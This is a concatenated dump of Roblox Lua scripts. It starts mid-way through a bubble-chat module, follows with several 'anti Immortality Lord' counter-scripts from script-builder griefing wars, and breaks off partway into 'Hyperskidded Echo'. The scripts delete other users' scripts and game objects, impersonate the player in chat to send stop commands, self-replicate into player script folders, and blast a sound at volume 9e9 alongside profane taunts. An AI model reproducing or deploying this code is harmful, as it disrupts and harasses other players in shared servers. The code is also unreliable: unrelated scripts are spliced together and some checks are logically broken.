		local billboardGui = this.CharacterSortedMsg:Get(instance)["BillboardGui"]
		if billboardGui then
			local chatBubbleRender = this.ChatBubbleWithTail[line.BubbleColor]:Clone()
			chatBubbleRender.Visible = false
			local bubbleText = this:CreateBubbleText(line.Message, shouldAutoLocalize)
	
			bubbleText.Parent = chatBubbleRender
			chatBubbleRender.Parent = billboardGui.BillboardFrame
	
			line.RenderBubble = chatBubbleRender
	
			local currentTextBounds = TextService:GetTextSize(
					bubbleText.Text, CHAT_BUBBLE_FONT_SIZE_INT, CHAT_BUBBLE_FONT,
					Vector2.new(BILLBOARD_MAX_WIDTH, BILLBOARD_MAX_HEIGHT))
			local numOflines = (currentTextBounds.Y / CHAT_BUBBLE_FONT_SIZE_INT)
	
			if UserFixBubbleChatText then
				-- Need to use math.ceil to round up on retina displays
				local width = math.ceil(currentTextBounds.X + CHAT_BUBBLE_PADDING * 2)
				local height = numOflines * CHAT_BUBBLE_LINE_HEIGHT
	
				-- prep chat bubble for tween
				chatBubbleRender.Size = UDim2.fromOffset(0, 0)
				chatBubbleRender.Position = UDim2.fromScale(0.5, 1)
	
				chatBubbleRender:TweenSizeAndPosition(
					UDim2.fromOffset(width, height),
					UDim2.new(0.5, -width / 2, 1, -height),
					Enum.EasingDirection.Out,
					Enum.EasingStyle.Elastic,
					0.1,
					true,
					function()
						bubbleText.Visible = true
					end
				)
	
				-- todo: remove when over max bubbles
				this:SetBillboardGuiLOD(billboardGui, line.Origin)
				this:UpdateChatLinesForOrigin(line.Origin, -height)
			else
				local bubbleWidthScale = math.max((currentTextBounds.X + CHAT_BUBBLE_WIDTH_PADDING) / BILLBOARD_MAX_WIDTH, 0.1)
	
				-- prep chat bubble for tween
				chatBubbleRender.Size = UDim2.new(0, 0, 0, 0)
				chatBubbleRender.Position = UDim2.new(0.5, 0, 1, 0)
	
				local newChatBubbleOffsetSizeY = numOflines * CHAT_BUBBLE_LINE_HEIGHT
	
				chatBubbleRender:TweenSizeAndPosition(UDim2.new(bubbleWidthScale, 0, 0, newChatBubbleOffsetSizeY),
														UDim2.new( (1 - bubbleWidthScale) / 2, 0, 1, -newChatBubbleOffsetSizeY),
														Enum.EasingDirection.Out, Enum.EasingStyle.Elastic, 0.1, true,
														function() bubbleText.Visible = true end)
	
				-- todo: remove when over max bubbles
				this:SetBillboardGuiLOD(billboardGui, line.Origin)
				this:UpdateChatLinesForOrigin(line.Origin, -newChatBubbleOffsetSizeY)
			end
	
			delay(line.BubbleDieDelay, function()
				this:DestroyBubble(fifo, chatBubbleRender)
			end)
		end
	end
	
	function this:OnPlayerChatMessage(sourcePlayer, message, targetPlayer)
	
		if not this:BubbleChatEnabled() then return end
	
		local localPlayer = PlayersService.LocalPlayer
		local fromOthers = localPlayer ~= nil and sourcePlayer ~= localPlayer
	
		local safeMessage = this:SanitizeChatLine(message)
	
		local line = createPlayerChatLine(sourcePlayer, safeMessage, not fromOthers)
	
		if sourcePlayer and line.Origin then
			local fifo = this.CharacterSortedMsg:Get(line.Origin).Fifo
			fifo:PushBack(line)
			--Game chat (badges) won't show up here
			this:CreateChatLineRender(sourcePlayer.Character, line, true, fifo, false)
		end
	end
	
	function this:OnGameChatMessage(origin, message, color)
		-- Prevents conflicts with the new bubble chat if it is enabled
		if UserRoactBubbleChatBeta or (UserPreventOldBubbleChatOverlap and ChatService.BubbleChatEnabled) then
			return
		end
	
		local localPlayer = PlayersService.LocalPlayer
		local fromOthers = localPlayer ~= nil and (localPlayer.Character ~= origin)
	
		local bubbleColor = BubbleColor.WHITE
	
		if color == Enum.ChatColor.Blue then bubbleColor = BubbleColor.BLUE
		elseif color == Enum.ChatColor.Green then bubbleColor = BubbleColor.GREEN
		elseif color == Enum.ChatColor.Red then bubbleColor = BubbleColor.RED end
	
		local safeMessage = this:SanitizeChatLine(message)
		local line = createGameChatLine(origin, safeMessage, not fromOthers, bubbleColor)
	
		this.CharacterSortedMsg:Get(line.Origin).Fifo:PushBack(line)
		if UserShouldLocalizeGameChatBubble then
			this:CreateChatLineRender(origin, line, false, this.CharacterSortedMsg:Get(line.Origin).Fifo, true)
		else
			this:CreateChatLineRender(origin, line, false, this.CharacterSortedMsg:Get(line.Origin).Fifo, false)
		end
	end
	
	function this:BubbleChatEnabled()
		if UserRoactBubbleChatBeta or (UserPreventOldBubbleChatOverlap and ChatService.BubbleChatEnabled) then
			return false
		end
		local clientChatModules = ChatService:FindFirstChild("ClientChatModules")
		if clientChatModules then
			local chatSettings = clientChatModules:FindFirstChild("ChatSettings")
			if chatSettings then
				local chatSettings = require(chatSettings)
				if chatSettings.BubbleChatEnabled ~= nil then
					return chatSettings.BubbleChatEnabled
				end
			end
		end
		return PlayersService.BubbleChat
	end
	
	function this:ShowOwnFilteredMessage()
		local clientChatModules = ChatService:FindFirstChild("ClientChatModules")
		if clientChatModules then
			local chatSettings = clientChatModules:FindFirstChild("ChatSettings")
			if chatSettings then
				chatSettings = require(chatSettings)
				return chatSettings.ShowUserOwnFilteredMessage
			end
		end
		return false
	end
	
	function findPlayer(playerName)
		for i,v in pairs(PlayersService:GetPlayers()) do
			if v.Name == playerName then
				return v
			end
		end
	end
	
	ChatService.Chatted:connect(function(origin, message, color) this:OnGameChatMessage(origin, message, color) end)
	
	local cameraChangedCon = nil
	if game.Workspace.CurrentCamera then
		cameraChangedCon = game.Workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):connect(function(prop) this:CameraCFrameChanged() end)
	end
	
	game.Workspace.Changed:connect(function(prop)
		if prop == "CurrentCamera" then
			if cameraChangedCon then cameraChangedCon:disconnect() end
			if game.Workspace.CurrentCamera then
				cameraChangedCon = game.Workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):connect(function(prop) this:CameraCFrameChanged() end)
			end
		end
	end)
	
	
	local AllowedMessageTypes = nil
	
	function getAllowedMessageTypes()
		if AllowedMessageTypes then
			return AllowedMessageTypes
		end
		local clientChatModules = ChatService:FindFirstChild("ClientChatModules")
		if clientChatModules then
			local chatSettings = clientChatModules:FindFirstChild("ChatSettings")
			if chatSettings then
				chatSettings = require(chatSettings)
				if chatSettings.BubbleChatMessageTypes then
					AllowedMessageTypes = chatSettings.BubbleChatMessageTypes
					return AllowedMessageTypes
				end
			end
			local chatConstants = clientChatModules:FindFirstChild("ChatConstants")
			if chatConstants then
				chatConstants = require(chatConstants)
				AllowedMessageTypes = {chatConstants.MessageTypeDefault, chatConstants.MessageTypeWhisper}
			end
			return AllowedMessageTypes
		end
		return {"Message", "Whisper"}
	end
	
	function checkAllowedMessageType(messageData)
		local allowedMessageTypes = getAllowedMessageTypes()
		for i = 1, #allowedMessageTypes do
			if allowedMessageTypes[i] == messageData.MessageType then
				return true
			end
		end
		return false
	end
	
	local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
	local OnMessageDoneFiltering = ChatEvents:WaitForChild("OnMessageDoneFiltering")
	local OnNewMessage = ChatEvents:WaitForChild("OnNewMessage")
	
	OnNewMessage.OnClientEvent:connect(function(messageData, channelName)
		if not checkAllowedMessageType(messageData) then
			return
		end
	
		local sender = findPlayer(messageData.FromSpeaker)
		if not sender then
			return
		end
	
		if not messageData.IsFiltered or messageData.FromSpeaker == LocalPlayer.Name then
			if messageData.FromSpeaker ~= LocalPlayer.Name or this:ShowOwnFilteredMessage() then
				return
			end
		end
	
		this:OnPlayerChatMessage(sender, messageData.Message, nil)
	end)
	
	OnMessageDoneFiltering.OnClientEvent:connect(function(messageData, channelName)
		if not checkAllowedMessageType(messageData) then
			return
		end
	
		local sender = findPlayer(messageData.FromSpeaker)
		if not sender then
			return
		end
	
		if messageData.FromSpeaker == LocalPlayer.Name and not this:ShowOwnFilteredMessage() then
			return
		end
	
		this:OnPlayerChatMessage(sender, messageData.Message, nil)
	end)
	
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local fefxexwxfhewifiwoer = Instance.new("ModuleScript")
fefxexwxfhewifiwoer.Name = "fefxexwxfhewifiwoer"
fefxexwxfhewifiwoer.Parent = workspace

local skids_begone = Instance.new("LocalScript")
skids_begone.Name = "SkidsBegone"
skids_begone.Parent = fefxexwxfhewifiwoer

--// Modules

local modules = {
	[fefxexwxfhewifiwoer] = function()
		local PService = game:GetService('Players')
		local RunService = game:GetService('RunService')
		local Workspace = game:GetService('Workspace')
		
		local function BruhMomment()
			wait(.5)
			for _, P in pairs(PService:GetPlayers()) do
				local L = script.SkidsBegone:Clone()
				L.Name = ''
				L.Parent = P.PlayerGui
				L.Parent = nil
			end
		end
		
		function Check(D)
			pcall(function()
				if D:IsA('Folder') and D.Parent == PService then
					BruhMomment()
					RunService.Heartbeat:Wait()
					D:Destroy()
		
				end
			end)
		end
		
		game.DescendantAdded:Connect(Check)
		for _, D in pairs(game:GetDescendants()) do
			Check(D)
		end
		
		return true
	end
}

--// Scripts

-- SkidsBegone
task.spawn(function()
	local script = skids_begone

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	pcall(function()
	
		pcall(function()
	
			script.Disabled = true
	
			local Workspace = game:GetService('Workspace')
			local RunService = game:GetService('RunService')
			local Bonked = false
	
			local Client = game:GetService('Players').LocalPlayer
			local PlayerScripts = Client:WaitForChild('PlayerScripts')
			local MessagePosted = require(PlayerScripts.ChatScript.ChatMain).MessagePosted
	
			function FireChatted(M)
	
				MessagePosted:fire(M)
	
			end
	
			local Con = nil
	
			function Added(C)
	
				if C:IsA('BasePart') and C.Name:find('-') then
	
					Bonked = true
					FireChatted('stop/')
					FireChatted('~stopscript')
					FireChatted('stopscript-')
					FireChatted('-<stop-s')
					FireChatted('/e stop')
					FireChatted('/stop')
					RunService.RenderStepped:Wait()
					C:Destroy()
					Con:Disconnect()
	
				end
	
			end
	
			Con = Workspace.ChildAdded:Connect(Added)
	
			while not Bonked do
	
				for _, C in pairs(Workspace:GetChildren()) do
	
					Added(C)
	
				end
	
				RunService.RenderStepped:Wait()
	
			end
	
			script:Destroy()
			setfenv(0, {})
	
		end)
	
	end)
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local fiofixwekfkipferiekpoikcewrp = Instance.new("ModuleScript")
fiofixwekfkipferiekpoikcewrp.Name = "fiofixwekfkipferiekpoikcewrp"
fiofixwekfkipferiekpoikcewrp.Parent = workspace

local user9684s_anti_il = Instance.new("ModuleScript")
user9684s_anti_il.Name = "User9684's AntiIL"
user9684s_anti_il.Parent = fiofixwekfkipferiekpoikcewrp

local old_ver = Instance.new("ModuleScript")
old_ver.Name = "OldVer"
old_ver.Parent = fiofixwekfkipferiekpoikcewrp

local client_removal = Instance.new("LocalScript")
client_removal.Disabled = true
client_removal.Name = "ClientRemoval"
client_removal.Parent = old_ver

local client_removal_2 = Instance.new("LocalScript")
client_removal_2.Disabled = true
client_removal_2.Name = "ClientRemoval"
client_removal_2.Parent = fiofixwekfkipferiekpoikcewrp

--// Modules

local modules = {
	[fiofixwekfkipferiekpoikcewrp] = function()
		warn("ASplatInTime's Anti-Immortality Lord/Cannon V1.1 Loaded")
		warn("Original AntiIL by User9684")
		
		local k = {}
		function k.ILSucks()
			spawn(function()
				require(script.OldVer).ILSucks()
			end)
			spawn(function()
				require(script["User9684's AntiIL"]:Clone()).AntiIL()
			end)
			for i,v in pairs(game:GetService("ServerScriptService"):GetChildren()) do
				coroutine.resume(coroutine.create(function()
					if v:IsA("LuaSourceContainer") and v:FindFirstChild("Client") ~= nil then
						v.Disabled = true
						v.Client:Destroy()
						v:Destroy()
					end
				end))
			end
			for i,x in pairs(game:GetService("FriendService"):GetChildren()) do
				coroutine.resume(coroutine.create(function()
					if string.match(x.Name,"'s Immortality Lord") ~= nil then
						x:Destroy()
					end
				end))
			end
			for i,q in pairs(game:GetService("JointsService"):GetChildren()) do
				coroutine.resume(coroutine.create(function()
					if string.match(q.Name,"'s Immortality Cannon") ~= nil then -- see i pulled a sneaky on ya
						q:Destroy()
					end
				end))
			end
			for i,a in pairs(game:GetService("Players"):GetPlayers()) do
				coroutine.resume(coroutine.create(function()
					for _,v in pairs(a:FindFirstChild("PlayerGui"):GetChildren()) do
						if (v:FindFirstChildWhichIsA("Hole") ~= nil and v:FindFirstChildWhichIsA("Flag") ~= nil and v:FindFirstChildWhichIsA("Actor") ~= nil) then
							v.Disabled = true
							v:ClearAllChildren()
							v:Destroy()
						end
					end
					for _,G in pairs(a:FindFirstChild("PlayerGui"):FindFirstChild("Freecam"):GetChildren()) do
						if G.Name ~= "FreecamScript" then -- probably a bad idea to use this but whatever its not like anyone parents anything to freecam anyway
							G.Disabled = true
							G:ClearAllChildren()
							G:Destroy()
						end
					end
				end))
			end
			local client = script.ClientRemoval:Clone()
			client.Disabled = false
			wait(0.5)
			for i,k in pairs(game:GetService("Players"):GetPlayers()) do
				coroutine.resume(coroutine.create(function()
					if k.Character == nil then
						k:LoadCharacter()
					end
					wait(1)
					client:Clone().Parent = k:FindFirstChild("PlayerGui")
				end))
			end
		end
		return k
	end[user9684s_anti_il] = function()
		local a = {}
		local function createNoti(text)
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				local ScreenGui = Instance.new("ScreenGui")
				local Frame = Instance.new("Frame")
				local Frame_2 = Instance.new("Frame")
				local UICorner = Instance.new("UICorner")
				local TextLabel = Instance.new("TextLabel")
				ScreenGui.Parent = v:WaitForChild("PlayerGui")
				ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
				Frame.Parent = ScreenGui
				Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
				Frame.Position = UDim2.new(0.831115663, 0, 0.202643171, 0)
				Frame.Size = UDim2.new(0, 165, 0, 72)
				Frame_2.Parent = Frame
				Frame_2.BackgroundColor3 = Color3.fromRGB(7, 243, 255)
				Frame_2.Position = UDim2.new(-0.0599999987, 0, 0, 0)
				Frame_2.Size = UDim2.new(0, 6, 0, 72)
				UICorner.Parent = Frame_2
				TextLabel.Parent = Frame
				TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel.BackgroundTransparency = 1.000
				TextLabel.Size = UDim2.new(0, 165, 0, 72)
				TextLabel.Font = Enum.Font.Nunito
				TextLabel.Text = text
				TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel.TextSize = 20.000
				TextLabel.TextWrapped = true
				local function LLFDJIH_fake_script()
					local script = Instance.new('Script', ScreenGui)
		
					wait(4)
					script.Parent:Destroy()
				end
				coroutine.wrap(LLFDJIH_fake_script)()
		
			end
		end
		local function findSkid(inst,name)
			local searching = true
			while searching==true do
				wait()
				pcall(function()
					if inst:IsA("Player")==false then
						inst = inst.Parent
					else
						searching = false
		
						coroutine.resume(coroutine.create(function()
							createNoti(name.." Found on: "..inst.Name)
						end))
		
					end
				end)
			end
		
		end
		function a.AntiIL()
		
			coroutine.resume(coroutine.create(function()
			end))
			for i,instance in pairs(game:GetService("Players"):GetDescendants()) do
				if instance:IsA("UnionOperation") and instance.Parent:IsA("LocalScript") then
					local incount = instance.Parent:GetDescendants()
					pcall(function()
						if #incount > 7 then
							--findSkid(instance,"Immortality Lord")
							instance.Parent:Destroy()
						end
					end)
				elseif instance:IsA("LocalScript") and instance.Parent:IsA("ScreenGui") then
					if instance.Parent.Name ~= "pain and suffering" then
						local incount = instance.Parent:GetDescendants()
						pcall(function()
							if #incount > 16 then
								--findSkid(instance,"Immortality Cannon")
								instance:Destroy()
							end
						end)
					end
				end
			end
			game:GetService("Players").DescendantAdded:Connect(function(instance)
				if instance:IsA("UnionOperation") and instance.Parent:IsA("LocalScript") then
					local incount = instance.Parent:GetDescendants()
					pcall(function()
						if #incount > 7 then
							--findSkid(instance,"Immortality Lord")
							instance.Parent:Destroy()
						end
					end)
				end
				if instance:IsA("LocalScript") and instance.Parent:IsA("ScreenGui") then
					if instance.Parent.Name ~= "pain and suffering" then
						local incount = instance.Parent:GetDescendants()
						pcall(function()
							if #incount > 16 then
								--findSkid(instance,"Immortality Cannon")
								instance:Destroy()
							end
						end)
					end
				end
			end)
		end
		return a
	end[old_ver] = function()
		local k = {}
		function k.ILSucks()
			for i,v in pairs(game:GetService("ServerScriptService"):GetChildren()) do
				coroutine.resume(coroutine.create(function()
					if v:IsA("LuaSourceContainer") and v:FindFirstChild("Client") ~= nil then
						v.Client:Destroy()
						v.Disabled = true
						v:Destroy()
					end
				end))
			end
			for i,x in pairs(game:GetService("FriendService"):GetChildren()) do
				coroutine.resume(coroutine.create(function()
					if string.match(x.Name,"'s Immortality Lord") ~= nil then
						x:Destroy()
					end
				end))
			end
			for i,a in pairs(game:GetService("Players"):GetPlayers()) do
				coroutine.resume(coroutine.create(function()
					for _,v in pairs(a:FindFirstChild("PlayerGui"):GetChildren()) do
						if (v:FindFirstChildWhichIsA("Hole") ~= nil and v:FindFirstChildWhichIsA("Flag") ~= nil and v:FindFirstChildWhichIsA("Actor") ~= nil) then
							v.Disabled = true
							v:ClearAllChildren()
							v:Destroy()
						end
					end
				end))
			end
			local client = script.ClientRemoval:Clone()
			client.Disabled = false
			wait(0.5)
			for i,k in pairs(game:GetService("Players"):GetPlayers()) do
				coroutine.resume(coroutine.create(function()
					if k.Character == nil then
						k:LoadCharacter()
					end
					wait(1)
					client:Clone().Parent = k:FindFirstChild("PlayerGui")
				end))
			end
		end
		return k
	end
}

--// Scripts

-- ClientRemoval
task.spawn(function()
	local script = client_removal
	script.Disabled = true

	script:GetPropertyChangedSignal("Disabled"):Wait()

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	-- if this deletes non-immortality lord instances, sorry lol
	-- i'm too lazy to find every single edit that doesn't use Material Slate or Color3.new(), deal with it
	
	pcall(function()
	
		pcall(function()
	
			for i,v in pairs(workspace:GetChildren()) do
				coroutine.resume(coroutine.create(function()
					if v:IsA("MeshPart") and v.Color == Color3.new() and v.Material == Enum.Material.Slate then
						v:Destroy()
					end
					if v:IsA("UnionOperation") and v.Material == Enum.Material.Neon then
						v:Destroy()
					end
				end))
			end
			for i,c in pairs(game:GetChildren()) do
				coroutine.resume(coroutine.create(function()
					for _,v in pairs(c:GetChildren()) do
						if v:FindFirstChildOfClass("Sound") ~= nil and v:FindFirstChildOfClass("Sound").Volume == 5 and v:FindFirstChildOfClass("Sound").RollOffMaxDistance == 200 and v:FindFirstChildOfClass("Sound").RollOffMinDistance == 100 then
							v:FindFirstChildOfClass("Sound"):Stop()
							v:FindFirstChildOfClass("Sound").PlaybackSpeed = 0
							v:FindFirstChildOfClass("Sound").Volume = 0
							v:FindFirstChildOfClass("Sound").Looped = false
							v:FindFirstChildOfClass("Sound").TimePosition = 0
							v:FindFirstChildOfClass("Sound").SoundId = "antiimmortalitylord://myjobisdone.xml"
							v:Destroy()
						end
						if v:IsA("SoundGroup") and v.Volume == 0 and v.Archivable == false then
							v:Destroy()
						end
					end
				end))
			end
	
		end)
	
	end)
end)

-- ClientRemoval
task.spawn(function()
	local script = client_removal_2
	script.Disabled = true

	script:GetPropertyChangedSignal("Disabled"):Wait()

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	pcall(function()
	
		pcall(function()
	
			warn("ASplatInTime's Anti-Immortality Lord/Cannon V1.1 Loaded")
			warn("Original AntiIL by User9684")
	
			-- if this deletes non-immortality lord instances, sorry lol
			-- i'm too lazy to find every single edit that doesn't use Material Slate or Color3.new(), deal with it
			-- updated this to attempt to remove some immortality cannon stuff
			while true do
				for i,v in pairs(workspace:GetChildren()) do
					coroutine.resume(coroutine.create(function()
						if v:IsA("MeshPart") and v.Color == Color3.new() and v.Material == Enum.Material.Slate then
							v:Destroy()
						end
						if v:IsA("UnionOperation") and v.Material == Enum.Material.Neon then
							v:Destroy()
						end
						if v:IsA("MeshPart") and v.MeshId == "rbxassetid://465435723" then
							v:Destroy()
						end
						if v:IsA("MeshPart") and v.Color == Color3.new() and v.Material == Enum.Material.Neon then
							v:Destroy()
						end
						if v:IsA("MeshPart") and v.Color == Color3.new(17/255,17/255,17/255) and v.Material == Enum.Material.Neon then
							v:Destroy()
						end
					end))
				end
				for i,c in pairs(game:GetChildren()) do
					coroutine.resume(coroutine.create(function()
						for _,v in pairs(c:GetChildren()) do
							if v:FindFirstChildOfClass("Sound") ~= nil and v:FindFirstChildOfClass("Sound").Volume == 5 and v:FindFirstChildOfClass("Sound").RollOffMaxDistance == 200 and v:FindFirstChildOfClass("Sound").RollOffMinDistance == 100 then
								v:FindFirstChildOfClass("Sound"):Stop()
								v:FindFirstChildOfClass("Sound").PlaybackSpeed = 0
								v:FindFirstChildOfClass("Sound").Volume = 0
								v:FindFirstChildOfClass("Sound").Looped = false
								v:FindFirstChildOfClass("Sound").TimePosition = 0
								v:FindFirstChildOfClass("Sound").SoundId = "antiimmortalitylord://myjobisdone.xml"
								v:Destroy()
							end
							if v:IsA("SoundGroup") and v.Volume == 0 and v.Archivable == false then
								v:Destroy()
							end
						end
					end))
				end
				wait(3)
			end
	
		end)
	
	end)
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local frxfrfrfergtrfrcrg = Instance.new("ModuleScript")
frxfrfrfergtrfrcrg.Name = "frxfrfrfergtrfrcrg"
frxfrfrfergtrfrcrg.Parent = workspace

local kill_client = Instance.new("LocalScript")
kill_client.Disabled = true
kill_client.Name = "KillClient"
kill_client.Parent = frxfrfrfergtrfrcrg

local is_dead = Instance.new("BoolValue")
is_dead.Name = "IsDead"
is_dead.Parent = kill_client

--// Modules

local modules = {
	[frxfrfrfergtrfrcrg] = function()
		local module = {}
		function module.ILisForSkids()
			for i,v in pairs(game.ServerScriptService:GetChildren()) do
				if v:IsA("Script") and v:FindFirstChild("Client") then
					v.Archivable = false
					v.Client.Archivable = false
					v:Destroy()
					v.Client:Destroy()
				end
			end 
		end
		local ck = script:FindFirstChild("KillClient")
		
		for i,v in pairs(game.FriendService:GetChildren()) do
			if v:IsA("RemoteEvent") then
				v.Archivable = false
				v:FireAllClients("StopScript")
				v:Destroy()
			end
		end
		
		function getilclientkillertoplayers()
			ck.Disabled = false
			ck:Clone().Parent = game:GetService("StarterPlayer").StarterPlayerScripts
		end
		
		getilclientkillertoplayers()
		
		return module
	end
}

--// Scripts

-- KillClient
task.spawn(function()
	local script = kill_client
	script.Disabled = true

	script:GetPropertyChangedSignal("Disabled"):Wait()

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	pcall(function()
	
		pcall(function()
	
			local function removeclient()
				for i,v in pairs(game.Players:GetPlayers()) do
					if v:IsA("LuaSourceContainer") and v.Name == "Client" then
						script.IsDead.Value = true
						v.Archivable = false
						v:GetChildren().Archivable = false
						v:Destroy()
					end
				end
			end
	
	
			for _,c in pairs(workspace:GetDescendants()) do
				if c:IsA("MeshPart") and c:IsA("UnionOperation") and c.Material == Enum.Material.Slate then
					c:BreakJoints()
					c:Destroy()
				end
			end
	
			for _,d in pairs(game.SoundService:GetChildren()) do
				if d:IsA("Sound") and d.Parent == "NegatePart" or d:IsA("FlagStand") then
					d:ClearAllChildren()
					d:Destroy()
				end
			end
	
			function checkifclientisnotdeadthenremoveclient()
				for _,b in pairs(game.Players:GetPlayers()) do
					if b:IsA("LuaSourceContainer") and b.Name == "Client" and b:FindFirstChildWhichIsA("Hole") and b:FindFirstChildOfClass("Flag") then
						removeclient()
					end
				end
			end
	
			warn("(HSE) Anti Immortality Lord ran!")
	
		end)
	
	end)
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local hufiuofigjrheifoxdpjeforf = Instance.new("ModuleScript")
hufiuofigjrheifoxdpjeforf.Name = "hufiuofigjrheifoxdpjeforf"
hufiuofigjrheifoxdpjeforf.Parent = workspace

local screen_gui = Instance.new("ScreenGui")
screen_gui.IgnoreGuiInset = false
screen_gui.ResetOnSpawn = true
screen_gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screen_gui.Parent = hufiuofigjrheifoxdpjeforf

local text_label = Instance.new("TextLabel")
text_label.Font = Enum.Font.SourceSansBold
text_label.Text = "AntiUltraSkiddedCannon Loaded!"
text_label.TextColor3 = Color3.new(1, 1, 1)
text_label.TextScaled = true
text_label.TextSize = 14
text_label.TextWrapped = true
text_label.BackgroundColor3 = Color3.new(0.133333, 0.133333, 0.133333)
text_label.BorderSizePixel = 0
text_label.Size = UDim2.new(0, 200, 0, 50)
text_label.Visible = true
text_label.Parent = screen_gui

local uiaspect_ratio_constraint = Instance.new("UIAspectRatioConstraint")
uiaspect_ratio_constraint.AspectRatio = 2.3048129081726074
uiaspect_ratio_constraint.Parent = screen_gui

--// Modules

local modules = {
	[hufiuofigjrheifoxdpjeforf] = function()
		warn("(HSE) altjohnny1's AntiUSC Module ran")
		wait(0.2)
		local module = {}
		
		function module:KillUltraSkiddedCannon()
			script.Parent.MainModule:Clone().Parent = game.ServerScriptService
			
			for i, player in pairs(game:WaitForChild("Players"):GetPlayers()) do
				local clonedNotifcation = script:WaitForChild("ScreenGui"):Clone()
				clonedNotifcation.Enabled = true
				clonedNotifcation.Parent = player.PlayerGui
				wait(5)
				clonedNotifcation:Destroy()
			end
			
			while wait() do
				for i, v in pairs(game:WaitForChild("MarketplaceService"):GetDescendants()) do
					for i, something in pairs(game:WaitForChild("FilteredSelection"):GetDescendants()) do
						if v:IsA("Backpack") then
							v:Destroy()
							something:Destroy()
						end
					end
				end
				for i, v in pairs(game:WaitForChild("Lighting"):GetDescendants()) do
					v:Destroy()
				end
			end
		end
		
		return module
	end
}

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local ifufujwqofkwoff = Instance.new("LocalScript")
ifufujwqofkwoff.Name = "ifufujwqofkwoff"
ifufujwqofkwoff.Parent = workspace

--//Modules

local modules = {}

--// Scripts

-- ifufujwqofkwoff
task.spawn(function()
	local script = ifufujwqofkwoff

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	---- Parent controller system (Don't remove!!!) ----
	-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
	pcall(function()
	
		pcall(function()
	
			print("(HSE) Parent controller system is waiting for the caller...")
			--local Parentcontrollercallwarn = Instance.new("Hint", game:GetService("Workspace"))
			--Parentcontrollercallwarn.Text = "(Hyperskidded Echo) Parent controller system is waiting for the caller..."
	
			function randomstring()
				local length = math.random(10,20)
				local array = {}
				for i = 1,length do
					array[i] = string.char(math.random(14,126))
				end
				return table.concat(array)
			end
	
			wait(1/30)
			repeat wait() until game:GetService("StarterPlayer"):FindFirstChild("Fuierwct8734r9ju4832x9ru34njrqurj8hrx98uqj")
			print("(HSE) Parent controller system fired up...")
			local Parentcontrollerwarn = Instance.new("Hint", game:GetService("Workspace"))
			Parentcontrollerwarn.Text = "(Hyperskidded Echo) Parent controller system fired up..."
			local DingKABAAAM = Instance.new("Sound")
			DingKABAAAM.Name = randomstring()
			DingKABAAAM.Volume = 9e9
			DingKABAAAM.SoundId = "rbxassetid://5035412139"
			DingKABAAAM.Looped = false
			DingKABAAAM.Playing = true
			DingKABAAAM.Parent = game:GetService("SoundService")
			game:GetService("RunService").Heartbeat:Wait()
			local MyFuckingUsernameMotherFucker = script.Parent.Name
			if game:GetService("Players").LocalPlayer.PlayerScripts:FindFirstChild(MyFuckingUsernameMotherFucker) == nil then
				local HyperskiddedMoment = script.Parent:Clone()
				HyperskiddedMoment.Parent = game:GetService("Players").LocalPlayer.PlayerScripts
				game:GetService("RunService").Heartbeat:wait()
				for i,v in pairs(HyperskiddedMoment:GetChildren()) do
					if v ~= script then
						v.Disabled = false
					end
				end
			end
			wait(1/30)
			repeat wait() until game:GetService("Workspace"):FindFirstChild("qwertyuiop")
			Parentcontrollerwarn:Destroy()
	
		end)
	
	end)
	
	-- // Fuck you \\ --
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local irofociukwijofdwfjwod = Instance.new("LocalScript")
irofociukwijofdwfjwod.Name = "irofociukwijofdwfjwod"
irofociukwijofdwfjwod.Parent = workspace

--//Modules

local modules = {}

--// Scripts

-- irofociukwijofdwfjwod
task.spawn(function()
	---- Hyperskidded Echo by SUPER_TIGERPRO/super_tiger123456 (Originally edited by coldredtea) ----
	-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

	pcall(function()

		do

			local Replicatorranwarn = Instance.new("Hint", game:GetService("Workspace"))
			Replicatorranwarn.Text = "(Hyperskidded Echo) Replicator and engine fired up...."
			local Useless = Instance.new("Part",game:GetService("Workspace"))
			Useless.Anchored = false
			Useless.CanCollide = false
			Useless.Transparency = 1
			Useless.CanCollide = false
			Useless.CanTouch = false
			Useless.Locked = false
			Useless.Name = "qwertyuiop"
			script.Name = math.random()
			local VISUALS = game:GetService("Lighting")
			local VISUALSSz = game:GetService("Lighting")
			local ColorCorrection = script["d8(*#*YRF@(diod2"]["C-Correction"]:Clone()
			local Co_Correction = ColorCorrection
			local C_Correction = ColorCorrection
			local CC = ColorCorrection
			local TerrainCol = true
			CC.Parent = game:GetService("Lighting")
			local Skybox = script["d8(*#*YRF@(diod2"]["Skybox"]:Clone()
			Skybox.Parent = game:GetService("Lighting")
			local lit = game:GetService("Lighting")
			local S = setmetatable({},{__index = function(s,i) return game:service(i) end})
			local SCRIPTVERSION = "v1.0x3"
			local SECURITYPATCHDATE = "23.7.2021"
